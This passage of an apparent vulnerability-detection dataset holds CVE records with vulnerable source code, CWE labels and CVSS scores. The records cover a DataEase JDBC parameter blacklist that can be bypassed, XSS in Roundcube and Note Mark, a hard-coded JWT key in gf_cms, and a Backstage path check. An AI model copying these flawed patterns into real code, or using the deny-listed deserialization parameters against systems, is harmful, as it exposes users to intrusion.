os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, two setup steps need to be done before calling this function:\n\n    * An environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    * The configure() function in this module must be called.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    \"\"\"\n    This function is part of setting up demo_uuid() to generate non-random UUIDs.  See demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 93,
          "content": "        try:"
        },
        {
          "line_no": 99,
          "content": "        except ValueError:"
        },
        {
          "line_no": 100,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 101,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 400,
    "cve": "CVE-2024-23328",
    "description": "Dataease is an open source data visualization analysis tool. A deserialization vulnerability exists in the DataEase datasource, which can be exploited to execute arbitrary code. The location of the vulnerability code is `core/core-backend/src/main/java/io/dataease/datasource/type/Mysql.java.` The blacklist of mysql jdbc attacks can be bypassed and attackers can further exploit it for deserialized execution or reading arbitrary files. This vulnerability is patched in 1.18.15 and 2.3.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "core/backend/src/main/java/io/dataease/dto/datasource/MysqlConfiguration.java",
          "content": "package io.dataease.dto.datasource;\n\nimport io.dataease.plugins.datasource.entity.JdbcConfiguration;\nimport lombok.Getter;\nimport lombok.Setter;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\n\n@Getter\n@Setter\npublic class MysqlConfiguration extends JdbcConfiguration {\n\n    private String driver = \"com.mysql.jdbc.Driver\";\n    private String extraParams = \"characterEncoding=UTF-8&connectTimeout=5000&useSSL=false&allowPublicKeyRetrieval=true&zeroDateTimeBehavior=convertToNull\";\n    private List<String> illegalParameters = Arrays.asList(\"autoDeserialize\", \"queryInterceptors\", \"statementInterceptors\", \"detectCustomCollations\", \"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\");\n\n    public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim());\n        } else {\n            for (String illegalParameter : getIllegalParameters()) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase())) {\n                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim()).replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n        }\n    }\n\n    public List<String> getIllegalParameters(){\n        List<String> newIllegalParameters = new ArrayList<>();\n        newIllegalParameters.addAll(illegalParameters);\n        newIllegalParameters.addAll(Arrays.asList(\"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\"));\n        return newIllegalParameters;\n    }\n\n}"
        }
      ],
      "method_level": [
        "public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim());\n        } else {\n            for (String illegalParameter : getIllegalParameters()) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase())) {\n                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim()).replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 25,
          "content": "                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase())) {"
        }
      ]
    },
    "cwe": [
      "CWE-502"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.1,
    "cvss_version": 3.1
  },
  {
    "id": 831,
    "cve": "CVE-2024-37384",
    "description": "Roundcube Webmail before 1.5.7 and 1.6.x before 1.6.7 allows XSS via list columns from user preferences.",
    "vulnerability": {
      "file_level": [
        {
          "name": "program/actions/mail/list.php",
          "content": "<?php\n\n/**\n +-----------------------------------------------------------------------+\n | This file is part of the Roundcube Webmail client                     |\n |                                                                       |\n | Copyright (C) The Roundcube Dev Team                                  |\n |                                                                       |\n | Licensed under the GNU General Public License version 3 or            |\n | any later version with exceptions for skins & plugins.                |\n | See the README file for a full license statement.                     |\n |                                                                       |\n | PURPOSE:                                                              |\n |   Send message list to client (as remote response)                    |\n +-----------------------------------------------------------------------+\n | Author: Thomas Bruederli <roundcube@gmail.com>                        |\n +-----------------------------------------------------------------------+\n*/\n\nclass rcmail_action_mail_list extends rcmail_action_mail_index\n{\n    protected static $mode = self::MODE_AJAX;\n\n    /**\n     * Request handler.\n     *\n     * @param array $args Arguments from the previous step(s)\n     */\n    public function run($args = [])\n    {\n        $rcmail        = rcmail::get_instance();\n        $save_arr      = [];\n        $dont_override = (array) $rcmail->config->get('dont_override');\n        $cols          = null;\n\n        // is there a sort type for this request?\n        $sort = rcube_utils::get_input_string('_sort', rcube_utils::INPUT_GET);\n        if ($sort && preg_match('/^[a-zA-Z_-]+$/', $sort)) {\n            // yes, so set the sort vars\n            list($sort_col, $sort_order) = explode('_', $sort);\n\n            // set session vars for sort (so next page and task switch know how to sort)\n            if (!in_array('message_sort_col', $dont_override)) {\n                $_SESSION['sort_col'] = $save_arr['message_sort_col'] = $sort_col;\n            }\n            if (!in_array('message_sort_order', $dont_override)) {\n                $_SESSION['sort_order'] = $save_arr['message_sort_order'] = $sort_order;\n            }\n        }\n\n        // is there a set of columns for this request?\n        if ($cols = rcube_utils::get_input_string('_cols', rcube_utils::INPUT_GET)) {\n            $_SESSION['list_attrib']['columns'] = explode(',', $cols);\n            if (!in_array('list_cols', $dont_override)) {\n                $save_arr['list_cols'] = explode(',', $cols);\n            }\n        }\n\n        // register layout change\n        if ($layout = rcube_utils::get_input_string('_layout', rcube_utils::INPUT_GET)) {\n            $rcmail->output->set_env('layout', $layout);\n            $save_arr['layout'] = $layout;\n            // force header replace on layout change\n            if (!empty($_SESSION['list_attrib']['columns'])) {\n                $cols = $_SESSION['list_attrib']['columns'];\n            }\n        }\n\n        if (!empty($save_arr)) {\n            $rcmail->user->save_prefs($save_arr);\n        }\n\n        $mbox_name = $rcmail->storage->get_folder();\n        $threading = (bool) $rcmail->storage->get_threading();\n\n        // Synchronize mailbox cache, handle flag changes\n        $rcmail->storage->folder_sync($mbox_name);\n\n        // fetch message headers\n        $a_headers = [];\n        if ($count = $rcmail->storage->count($mbox_name, $threading ? 'THREADS' : 'ALL', !empty($_REQUEST['_refresh']))) {\n            $a_headers = $rcmail->storage->list_messages($mbox_name, null, self::sort_column(), self::sort_order());\n        }\n\n        // update search set (possible change of threading mode)\n        if (!empty($_REQUEST['_search']) && isset($_SESSION['search'])\n            && $_SESSION['search_request'] == $_REQUEST['_search']\n        ) {\n            $search_request = $_REQUEST['_search'];\n            $_SESSION['search'] = $rcmail->storage->get_search_set();\n            $multifolder = !empty($_SESSION['search']) && !empty($_SESSION['search'][1]->multi);\n        }\n        // remove old search data\n        else if (empty($_REQUEST['_search']) && isset($_SESSION['search'])) {\n            $rcmail->session->remove('search');\n        }\n\n        self::list_pagetitle();\n\n        // update mailboxlist\n        if (empty($search_request)) {\n            self::send_unread_count($mbox_name, !empty($_REQUEST['_refresh']), empty($a_headers) ? 0 : null);\n        }\n\n        // update message count display\n        $pages  = ceil($count / $rcmail->storage->get_pagesize());\n        $page   = $count ? $rcmail->storage->get_page() : 1;\n        $exists = $rcmail->storage->count($mbox_name, 'EXISTS', true);\n\n        $rcmail->output->set_env('messagecount', $count);\n        $rcmail->output->set_env('pagecount', $pages);\n        $rcmail->output->set_env('threading', $threading);\n        $rcmail->output->set_env('current_page', $page);\n        $rcmail->output->set_env('exists', $exists);\n        $rcmail->output->command('set_rowcount', self::get_messagecount_text($count), $mbox_name);\n\n        // remove old message rows if commanded by the client\n        if (!empty($_REQUEST['_clear'])) {\n            $rcmail->output->command('clear_message_list');\n        }\n\n        // add message rows\n        self::js_message_list($a_headers, false, $cols);\n\n        if (!empty($a_headers)) {\n            if (!empty($search_request)) {\n                $rcmail->output->show_message('searchsuccessful', 'confirmation', ['nr' => $count]);\n            }\n\n            // remember last HIGHESTMODSEQ value (if supported)\n            // we need it for flag updates in check-recent\n            $data = $rcmail->storage->folder_data($mbox_name);\n            if (!empty($data['HIGHESTMODSEQ'])) {\n                $_SESSION['list_mod_seq'] = $data['HIGHESTMODSEQ'];\n            }\n        }\n        else {\n            // handle IMAP errors (e.g. #1486905)\n            if ($err_code = $rcmail->storage->get_error_code()) {\n                self::display_server_error();\n            }\n            else if (!empty($search_request)) {\n                $rcmail->output->show_message('searchnomatch', 'notice');\n            }\n            else {\n                $rcmail->output->show_message('nomessagesfound', 'notice');\n            }\n        }\n\n        // set trash folder state\n        if ($mbox_name === $rcmail->config->get('trash_mbox')) {\n            $rcmail->output->command('set_trash_count', $exists);\n        }\n\n        if ($page == 1) {\n            $rcmail->output->command('set_quota', self::quota_content(null, !empty($multifolder) ? 'INBOX' : $mbox_name));\n        }\n\n        // send response\n        $rcmail->output->send();\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function run($args = [])\n    {\n        $rcmail        = rcmail::get_instance();\n        $save_arr      = [];\n        $dont_override = (array) $rcmail->config->get('dont_override');\n        $cols          = null;\n\n        // is there a sort type for this request?\n        $sort = rcube_utils::get_input_string('_sort', rcube_utils::INPUT_GET);\n        if ($sort && preg_match('/^[a-zA-Z_-]+$/', $sort)) {\n            // yes, so set the sort vars\n            list($sort_col, $sort_order) = explode('_', $sort);\n\n            // set session vars for sort (so next page and task switch know how to sort)\n            if (!in_array('message_sort_col', $dont_override)) {\n                $_SESSION['sort_col'] = $save_arr['message_sort_col'] = $sort_col;\n            }\n            if (!in_array('message_sort_order', $dont_override)) {\n                $_SESSION['sort_order'] = $save_arr['message_sort_order'] = $sort_order;\n            }\n        }\n\n        // is there a set of columns for this request?\n        if ($cols = rcube_utils::get_input_string('_cols', rcube_utils::INPUT_GET)) {\n            $_SESSION['list_attrib']['columns'] = explode(',', $cols);\n            if (!in_array('list_cols', $dont_override)) {\n                $save_arr['list_cols'] = explode(',', $cols);\n            }\n        }\n\n        // register layout change\n        if ($layout = rcube_utils::get_input_string('_layout', rcube_utils::INPUT_GET)) {\n            $rcmail->output->set_env('layout', $layout);\n            $save_arr['layout'] = $layout;\n            // force header replace on layout change\n            if (!empty($_SESSION['list_attrib']['columns'])) {\n                $cols = $_SESSION['list_attrib']['columns'];\n            }\n        }\n\n        if (!empty($save_arr)) {\n            $rcmail->user->save_prefs($save_arr);\n        }\n\n        $mbox_name = $rcmail->storage->get_folder();\n        $threading = (bool) $rcmail->storage->get_threading();\n\n        // Synchronize mailbox cache, handle flag changes\n        $rcmail->storage->folder_sync($mbox_name);\n\n        // fetch message headers\n        $a_headers = [];\n        if ($count = $rcmail->storage->count($mbox_name, $threading ? 'THREADS' : 'ALL', !empty($_REQUEST['_refresh']))) {\n            $a_headers = $rcmail->storage->list_messages($mbox_name, null, self::sort_column(), self::sort_order());\n        }\n\n        // update search set (possible change of threading mode)\n        if (!empty($_REQUEST['_search']) && isset($_SESSION['search'])\n            && $_SESSION['search_request'] == $_REQUEST['_search']\n        ) {\n            $search_request = $_REQUEST['_search'];\n            $_SESSION['search'] = $rcmail->storage->get_search_set();\n            $multifolder = !empty($_SESSION['search']) && !empty($_SESSION['search'][1]->multi);\n        }\n        // remove old search data\n        else if (empty($_REQUEST['_search']) && isset($_SESSION['search'])) {\n            $rcmail->session->remove('search');\n        }\n\n        self::list_pagetitle();\n\n        // update mailboxlist\n        if (empty($search_request)) {\n            self::send_unread_count($mbox_name, !empty($_REQUEST['_refresh']), empty($a_headers) ? 0 : null);\n        }\n\n        // update message count display\n        $pages  = ceil($count / $rcmail->storage->get_pagesize());\n        $page   = $count ? $rcmail->storage->get_page() : 1;\n        $exists = $rcmail->storage->count($mbox_name, 'EXISTS', true);\n\n        $rcmail->output->set_env('messagecount', $count);\n        $rcmail->output->set_env('pagecount', $pages);\n        $rcmail->output->set_env('threading', $threading);\n        $rcmail->output->set_env('current_page', $page);\n        $rcmail->output->set_env('exists', $exists);\n        $rcmail->output->command('set_rowcount', self::get_messagecount_text($count), $mbox_name);\n\n        // remove old message rows if commanded by the client\n        if (!empty($_REQUEST['_clear'])) {\n            $rcmail->output->command('clear_message_list');\n        }\n\n        // add message rows\n        self::js_message_list($a_headers, false, $cols);\n\n        if (!empty($a_headers)) {\n            if (!empty($search_request)) {\n                $rcmail->output->show_message('searchsuccessful', 'confirmation', ['nr' => $count]);\n            }\n\n            // remember last HIGHESTMODSEQ value (if supported)\n            // we need it for flag updates in check-recent\n            $data = $rcmail->storage->folder_data($mbox_name);\n            if (!empty($data['HIGHESTMODSEQ'])) {\n                $_SESSION['list_mod_seq'] = $data['HIGHESTMODSEQ'];\n            }\n        }\n        else {\n            // handle IMAP errors (e.g. #1486905)\n            if ($err_code = $rcmail->storage->get_error_code()) {\n                self::display_server_error();\n            }\n            else if (!empty($search_request)) {\n                $rcmail->output->show_message('searchnomatch', 'notice');\n            }\n            else {\n                $rcmail->output->show_message('nomessagesfound', 'notice');\n            }\n        }\n\n        // set trash folder state\n        if ($mbox_name === $rcmail->config->get('trash_mbox')) {\n            $rcmail->output->command('set_trash_count', $exists);\n        }\n\n        if ($page == 1) {\n            $rcmail->output->command('set_quota', self::quota_content(null, !empty($multifolder) ? 'INBOX' : $mbox_name));\n        }\n\n        // send response\n        $rcmail->output->send();\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 34,
          "content": "        $cols          = null;"
        },
        {
          "line_no": 36,
          "content": "        // is there a sort type for this request?"
        },
        {
          "line_no": 52,
          "content": "        if ($cols = rcube_utils::get_input_string('_cols', rcube_utils::INPUT_GET)) {"
        },
        {
          "line_no": 60,
          "content": "        if ($layout = rcube_utils::get_input_string('_layout', rcube_utils::INPUT_GET)) {"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 1014,
    "cve": "CVE-2024-41819",
    "description": "Note Mark is a web-based Markdown notes app. A stored cross-site scripting (XSS) vulnerability in Note Mark allows attackers to execute arbitrary web scripts via a crafted payload injected into the URL value of a link in the markdown content. This vulnerability is fixed in 0.13.1.",
    "vulnerability": {
      "file_level": [
        {
          "name": "frontend/src/core/renderer.ts",
          "content": "import DOMPurify from 'dompurify';\n\nimport { markdown_to_html } from '../../renderer/pkg';\n// Render markdown into HTML,\n// will sanitize input to prevent possible XSS attacks\nfunction render(content: string): string {\n  content = DOMPurify.sanitize(content)\n  return markdown_to_html(content)\n}\n\nexport default render\n"
        }
      ],
      "method_level": [
        "render"
      ],
      "hunk_level": [
        {
          "line_no": 7,
          "content": "  content = DOMPurify.sanitize(content)"
        },
        {
          "line_no": 8,
          "content": "  return markdown_to_html(content)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 8.7,
    "cvss_version": 3.1
  },
  {
    "id": 1101,
    "cve": "CVE-2024-8005",
    "description": "A vulnerability was found in demozx gf_cms 1.0/1.0.1. It has been classified as critical. This affects the function init of the file internal/logic/auth/auth.go of the component JWT Authentication. The manipulation leads to hard-coded credentials. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 1.0.2 is able to address this issue. The patch is named be702ada7cb6fdabc02689d90b38139c827458a5. It is recommended to upgrade the affected component.",
    "vulnerability": {
      "file_level": [
        {
          "name": "internal/logic/auth/auth.go",
          "content": "package auth\n\nimport (\n\t\"context\"\n\t\"gf_cms/internal/logic/admin\"\n\t\"gf_cms/internal/model\"\n\t\"gf_cms/internal/service\"\n\t\"time\"\n\n\tjwt \"github.com/gogf/gf-jwt/v2\"\n\t\"github.com/gogf/gf/v2/frame/g\"\n)\n\nvar authService *jwt.GfJWTMiddleware\n\ntype (\n\tsAuth struct{}\n)\n\nvar (\n\tinsAuth = sAuth{}\n)\n\nfunc Auth() *sAuth {\n\treturn &insAuth\n}\n\nfunc (*sAuth) JWTAuth() *jwt.GfJWTMiddleware {\n\treturn authService\n}\n\nfunc init() {\n\tservice.RegisterAuth(New())\n\n\tauth := jwt.New(&jwt.GfJWTMiddleware{\n\t\tRealm:           \"test zone\",\n\t\tKey:             []byte(\"secret key\"),\n\t\tTimeout:         time.Minute * 5,\n\t\tMaxRefresh:      time.Minute * 5,\n\t\tIdentityKey:     \"id\",\n\t\tTokenLookup:     \"header: Authorization, query: token, cookie: jwt\",\n\t\tTokenHeadName:   \"Bearer\",\n\t\tTimeFunc:        time.Now,\n\t\tAuthenticator:   Auth().Authenticator,\n\t\tUnauthorized:    Auth().Unauthorized,\n\t\tPayloadFunc:     Auth().PayloadFunc,\n\t\tIdentityHandler: Auth().IdentityHandler,\n\t})\n\tauthService = auth\n}\n\nfunc New() *sAuth {\n\treturn &sAuth{}\n}\n\n// PayloadFunc is a callback function that will be called during login.\n// Using this function it is possible to add additional payload data to the webtoken.\n// The data is then made available during requests via c.Get(\"JWT_PAYLOAD\").\n// Note that the payload is not encrypted.\n// The attributes mentioned on jwt.io can't be used as keys for the map.\n// Optional, by default no additional data will be set.\nfunc (*sAuth) PayloadFunc(data interface{}) jwt.MapClaims {\n\tclaims := jwt.MapClaims{}\n\tparams := data.(map[string]interface{})\n\tif len(params) > 0 {\n\t\tfor k, v := range params {\n\t\t\tclaims[k] = v\n\t\t}\n\t}\n\treturn claims\n}\n\n// IdentityHandler get the identity from JWT and set the identity for every request\n// Using this function, by r.GetParam(\"id\") get identity\nfunc (*sAuth) IdentityHandler(ctx context.Context) interface{} {\n\tclaims := jwt.ExtractClaims(ctx)\n\treturn claims[authService.IdentityKey]\n}\n\n// Unauthorized is used to define customized Unauthorized callback function.\nfunc (*sAuth) Unauthorized(ctx context.Context, code int, message string) {\n\tr := g.RequestFromCtx(ctx)\n\tr.Response.WriteJson(g.Map{\n\t\t\"code\":    code,\n\t\t\"message\": message,\n\t})\n\tr.ExitAll()\n}\n\n// Authenticator is used to validate login parameters.\n// It must return user data as user identifier, it will be stored in Claim Array.\n// if your identityKey is 'id', your user data must have 'id'\n// CheckByRoleId error (e) to determine the appropriate error message.\nfunc (*sAuth) Authenticator(ctx context.Context) (interface{}, error) {\n\tvar (\n\t\tr  = g.RequestFromCtx(ctx)\n\t\tin model.AdminLoginInput\n\t)\n\tif err := r.Parse(&in); err != nil {\n\t\treturn \"\", err\n\t}\n\n\tif user := admin.Admin().GetUserByUserNamePassword(ctx, in); user != nil {\n\t\treturn user, nil\n\t}\n\n\treturn nil, jwt.ErrFailedAuthentication\n}\n"
        }
      ],
      "method_level": [
        "func init() {\n\tservice.RegisterAuth(New())\n\n\tauth := jwt.New(&jwt.GfJWTMiddleware{\n\t\tRealm:           \"test zone\",\n\t\tKey:             []byte(\"secret key\"),\n\t\tTimeout:         time.Minute * 5,\n\t\tMaxRefresh:      time.Minute * 5,\n\t\tIdentityKey:     \"id\",\n\t\tTokenLookup:     \"header: Authorization, query: token, cookie: jwt\",\n\t\tTokenHeadName:   \"Bearer\",\n\t\tTimeFunc:        time.Now,\n\t\tAuthenticator:   Auth().Authenticator,\n\t\tUnauthorized:    Auth().Unauthorized,\n\t\tPayloadFunc:     Auth().PayloadFunc,\n\t\tIdentityHandler: Auth().IdentityHandler,\n\t})\n\tauthService = auth\n}"
      ],
      "hunk_level": [
        {
          "line_no": 36,
          "content": "\t\tRealm:           \"test zone\","
        },
        {
          "line_no": 37,
          "content": "\t\tKey:             []byte(\"secret key\"),"
        }
      ]
    },
    "cwe": [
      "CWE-798"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.9,
    "cvss_version": 4.0
  },
  {
    "id": 338,
    "cve": "CVE-2024-26150",
    "description": "`@backstage/backend-common` is a common functionality library for backends for Backstage, an open platform for building developer portals. In `@backstage/backend-common` prior to versions 0.21.1, 0.20.2, and 0.19.10, paths checks with the `resolveSafeChildPath` utility were not exhaustive enough, leading to risk of path traversal vulnerabilities if symlinks can be injected by attackers. This issue is patched in `@backstage/backend-common` versions 0.21.1, 0.20.2, and 0.19.10.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/backend-common/src/paths.ts",
          "content": "/*\n * Copyright 2020 The Backstage Authors\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\nimport { isChildPath } from '@backstage/cli-common';\nimport { NotAllowedError } from '@backstage/errors';\nimport { resolve as resolvePath } from 'path';\nimport { realpathSync as realPath } from 'fs';\n\n/** @internal */\nexport const packagePathMocks = new Map<\n  string,\n  (paths: string[]) => string | undefined\n>();\n\n/**\n * Resolve a path relative to the root of a package directory.\n * Additional path arguments are resolved relative to the package dir.\n *\n * This is particularly useful when you want to access assets shipped with\n * your backend plugin package. When doing so, do not forget to include the assets\n * in your published package by adding them to `files` in your `package.json`.\n *\n * @public\n */\nexport function resolvePackagePath(name: string, ...paths: string[]) {\n  const mockedResolve = packagePathMocks.get(name);\n  if (mockedResolve) {\n    const resolved = mockedResolve(paths);\n    if (resolved) {\n      return resolved;\n    }\n  }\n\n  const req =\n    typeof __non_webpack_require__ === 'undefined'\n      ? require\n      : __non_webpack_require__;\n\n  return resolvePath(req.resolve(`${name}/package.json`), '..', ...paths);\n}\n\n/**\n * Resolves a target path from a base path while guaranteeing that the result is\n * a path that point to or within the base path. This is useful for resolving\n * paths from user input, as it otherwise opens up for vulnerabilities.\n *\n * @public\n * @param base - The base directory to resolve the path from.\n * @param path - The target path, relative or absolute\n * @returns A path that is guaranteed to point to or within the base path.\n */\nexport function resolveSafeChildPath(base: string, path: string): string {\n  const resolvedBasePath = resolveRealPath(base);\n  const targetPath = resolvePath(resolvedBasePath, path);\n\n  if 